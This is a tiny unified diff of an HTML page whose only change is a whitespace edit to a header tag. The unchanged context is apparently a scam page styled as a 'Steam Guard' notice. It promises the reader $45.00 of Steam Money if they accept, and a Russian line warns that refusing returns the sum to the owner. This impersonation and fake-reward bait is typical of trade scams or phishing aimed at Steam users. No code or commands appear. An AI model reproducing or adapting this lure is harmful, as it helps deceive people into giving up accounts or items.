@@ -10,7 +10,7 @@ charset=UTF-8" />
 </head>
 <body bgcolor="#000" background="fon.png">
 </body>
-<header>
+<header> 
 <p><font color="#00ffff"><b>Steam Guard:</font> <font color="#ffffff">Your account will be credited the amount of <font color="#00ff33">$45.00</font> worth of Steam Money it will be available after you accept.</font></b></p>
 <p><font color="#ff0033">Если вы откажетесь от обмена, сумма будет возвращена владельцу.</p></font>
 
